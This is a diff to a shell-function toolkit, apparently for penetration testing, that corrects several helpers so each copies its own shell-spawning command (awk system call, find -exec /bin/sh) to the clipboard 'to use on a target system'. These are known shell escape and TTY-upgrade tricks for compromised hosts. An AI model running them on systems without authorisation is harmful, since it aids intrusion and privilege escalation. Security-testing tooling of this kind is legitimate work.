@@ -90,44 +90,23 @@ nb-shell-tty-lua() {
 
 nb-shell-tty-awk() {
     __ok "Command to use on a target system copied to clipboard"
-    __COMMAND="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+    __COMMAND="awk 'begin {system(\"/bin/sh\")}'"
     echo "$__COMMAND" | wl-copy
-    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-python3"
-
-    __ok "copy the commands below and use on the remote system"
-    cat << "doc" 
-
-awk 'begin {system("/bin/sh")}'
-
-doc
+    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-awk"
 }
 
 nb-shell-tty-find() {
     __ok "Command to use on a target system copied to clipboard"
-    __COMMAND="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+    __COMMAND="find / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \;"
     echo "$__COMMAND" | wl-copy
-    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-python3"
-
-    __ok "copy the commands below and use on the remote system"
-    cat << "doc" 
-
-find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
-
-doc
+    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-find"
 }
 
 nb-shell-tty-find-exec() {
     __ok "Command to use on a target system copied to clipboard"
-    __COMMAND="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+    __COMMAND="find . -exec /bin/sh \; -quit"
     echo "$__COMMAND" | wl-copy
-    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-python3"
-
-    __ok "copy the commands below and use on the remote system"
-    cat << "doc" 
-
-find . -exec /bin/sh \; -quit
-
-doc
+    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-find-exec"
 }
 
 nb-shell-tty-expect() {
